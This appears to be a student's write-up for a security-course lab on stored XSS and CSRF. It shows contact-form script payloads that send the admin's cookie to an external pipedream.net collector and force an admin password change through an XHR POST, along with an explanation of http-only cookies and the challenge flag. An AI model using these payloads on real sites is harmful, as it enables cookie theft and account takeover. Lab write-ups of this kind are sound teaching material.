# SLH lab 1

## 2 Basic CSRF

### 2.1. The website is also vulnerable to an XSS. How can you detect it?

Using *pipedream.com*, we log the requests that are sent to `https://eobnzz43rvm4g8a.m.pipedream.net`

In the contact form, we send this message :

```
<script>window.location.href = "https://eobnzz43rvm4g8a.m.pipedream.net?bonjour=bonjour";</script>
```

In pipedream we see that a request was received with the param `bonjour=bonjour`, so we know that the script in our message was sent by the vulnerable server to the admin.

### 2.2. Try to exfiltrate the admin cookie with the XSS. It does not work because of http-only. Explain what is http-only and how it prevents the exfiltration.

In the contact form, we send this message :

```
<script>window.location.href = "https://eobnzz43rvm4g8a.m.pipedream.net?cookie="+document.cookie;</script>
```

But we don't receive anything in pipedream.

Http-only is a flag that the server can set when giving a cookie to a client. A http-only cookie will be provided by the client when it sends requests to the server, but is not accessible by the javascript executed by the client.

Consequentially, even if an attacker is able to control the javascript that is executed by a client, the attacker script will not be able to access the cookie.

### 2.3. The website is also vulnerable to a CSRF. Which script is vulnerable?

The script on the server for changing the password. When changing password, the client simply sends a POST request with his session cookie and the new password.

### 2.4. What is the flag of this challenge?

`f_J[w[4LY^^N7*Xe`

### 2.5. How did you obtain the flag? Describe clearly your attack. In particular, explain where the XSS is and what type of XSS it is

The XSS is in the contact form. If we send javascript code in this form, it will be sent back to the admin when he displays the message. This is a stored XSS.

Using our own account, we change our password to "1234" and display the POST request using the developer tools.

We see that
- The request is sent to `/profile/damien.maier@heig-vd.ch`
- The request has a header `Content-type: application/x-www-form-urlencoded`
- The POST payload is `password=1234`

In the contact form, we send this message :
```
<script>
    var url = "/profile/damien.maier@heig-vd.ch_admin";
    var params = "password=1234";
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    
    xhr.send(params);
</script>
```
When displaying the message, the admin browser will execute this script. The script sends a POST request with the appropriate header and payload to set the admin password to "1234".
As the script is executed in the admin's browser, the POST request will be sent with the session cookie of the admin.